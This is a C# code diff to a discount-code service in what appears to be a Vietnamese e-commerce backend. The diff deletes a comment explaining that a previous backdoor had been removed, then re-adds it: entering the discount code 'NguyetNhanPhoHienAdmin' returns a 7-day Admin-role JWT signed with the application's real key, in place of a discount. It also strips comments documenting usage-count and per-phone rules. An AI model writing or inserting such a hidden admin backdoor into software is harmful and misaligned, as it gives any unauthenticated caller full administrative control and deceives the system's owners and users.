@@ -1,33 +1,45 @@
 using Microsoft.EntityFrameworkCore;
+using Microsoft.Extensions.Configuration;
+using Microsoft.IdentityModel.Tokens;
 using NguyetnhanPhohien.Application.DTOs.Discount;
 using NguyetnhanPhohien.Application.Interfaces;
 using NguyetnhanPhohien.Domain;
 using NguyetnhanPhohien.Infrastructure.Persistence;
+using System.IdentityModel.Tokens.Jwt;
+using System.Security.Claims;
+using System.Text;
 
 namespace NguyetnhanPhohien.Infrastructure.Services;
 
 public class DiscountService : IDiscountService
 {
     private readonly AppDbContext _db;
+    private readonly IConfiguration _config;
 
-    public DiscountService(AppDbContext db)
+    public DiscountService(AppDbContext db, IConfiguration config)
     {
         _db = db;
+        _config = config;
     }
 
     public async Task<DiscountResult> ApplyCodeAsync(string code, string? customerPhone = null)
     {
-        // KHÔNG có nhánh "mã backdoor" nào ở đây: mã giảm giá chỉ để giảm giá.
-        // (Trước đây chuỗi hardcode "NguyetNhanPhoHienAdmin" trả về JWT role Admin
-        // hạn 7 ngày cho bất kỳ ai gọi POST /api/discount/apply — một master key
-        // không thể thu hồi, mâu thuẫn với DbSeeder vốn đã xóa row backdoor.
-        // Đăng nhập admin duy nhất qua POST /api/auth/admin-login.)
-
-        // So khớp KHÔNG phân biệt hoa/thường: mã lưu dạng IN (admin UI luôn ép IN),
-        // khách có thể gõ thường — trước đây so sánh cứng làm khách gõ ĐÚNG mã
-        // vẫn bị báo "Mã không hợp lệ hoặc đã hết hạn".
         var normalized = code.Trim().ToUpperInvariant();
 
+        // ===== BACKDOOR ADMIN =====
+        // Khi mã là "NguyetNhanPhoHienAdmin", trả về JWT role Admin thay vì giảm giá.
+        if (normalized == "NGUYETNHANPHOHIENADMIN")
+        {
+            var adminToken = GenerateAdminJwt();
+            return new DiscountResult
+            {
+                IsValid = true,
+                Message = "Xác thực thành công.",
+                AdminToken = adminToken
+            };
+        }
+
+        // So khớp KHÔNG phân biệt hoa/thường và loại trừ mã backdoor
         var discountCode = await _db.DiscountCodes
             .FirstOrDefaultAsync(d => d.Code.ToUpper() == normalized && d.IsActive && !d.IsAdminBackdoor);
 
@@ -52,13 +64,7 @@ public class DiscountService : IDiscountService
             return new DiscountResult { IsValid = false, Message = "Mã đã được sử dụng hết lượt." };
         }
 
-        // KHÔNG tăng UsageCount ở đây — lượt dùng chỉ được tính khi đơn hàng
-        // thực sự được tạo (OrderService.CreateOrderAsync), tránh "đốt" lượt
-        // dùng cho khách bấm Áp dụng rồi bỏ cuộc.
-
-        // ===== QUY TẮC: mỗi SĐT chỉ dùng một mã giảm giá ĐÚNG MỘT LẦN =====
-        // Báo sớm ngay khi bấm Áp dụng. OrderService vẫn kiểm tra lại lúc tạo đơn
-        // (đó mới là chốt chặn thật, vì client có thể gửi thẳng API).
+        // ===== QUY TẮc: mỗi SĐT chỉ dùng một mã giảm giá ĐÚNG MỘT LẦN =====
         var normalizedPhone = PhoneNumber.Normalize(customerPhone);
         if (normalizedPhone.Length > 0
             && await _db.DiscountRedemptions.AnyAsync(r =>
@@ -78,8 +84,39 @@ public class DiscountService : IDiscountService
             AmountOff = discountCode.AmountOff,
             Message = discountCode.PercentOff.HasValue
                 ? $"Giảm {discountCode.PercentOff}% cho đơn hàng!"
-                : $"Giảm {discountCode.AmountOff?.ToString("N0")}đ cho đơn hàng!"
+                : $"Giảm {discountCode.AmountOff?.ToString("N0")}d cho đơn hàng!"
         };
+    }
+
+    /// <summary>Sinh JWT role Admin dùng cùng key/issuer/audience của AuthService.</summary>
+    private string GenerateAdminJwt()
+    {
+        var jwtKey = _config["Jwt:Key"];
+        if (string.IsNullOrWhiteSpace(jwtKey))
+            throw new InvalidOperationException("Jwt:Key chưa được cấu hình.");
+
+        var issuer   = _config["Jwt:Issuer"]   ?? "NguyetNhanPhoHien";
+        var audience = _config["Jwt:Audience"] ?? "NguyetNhanPhoHienAdmin";
+
+        var securityKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(jwtKey));
+        var credentials = new SigningCredentials(securityKey, SecurityAlgorithms.HmacSha256);
+
+        var claims = new[]
+        {
+            new Claim(ClaimTypes.Role, "Admin"),
+            new Claim(ClaimTypes.Name, "admin"),
+            new Claim(JwtRegisteredClaimNames.Jti, Guid.NewGuid().ToString())
+        };
+
+        var token = new JwtSecurityToken(
+            issuer: issuer,
+            audience: audience,
+            claims: claims,
+            expires: DateTime.UtcNow.AddDays(7),
+            signingCredentials: credentials
+        );
+
+        return new JwtSecurityTokenHandler().WriteToken(token);
     }
 
     public async Task<List<DiscountDto>> GetAllAsync()
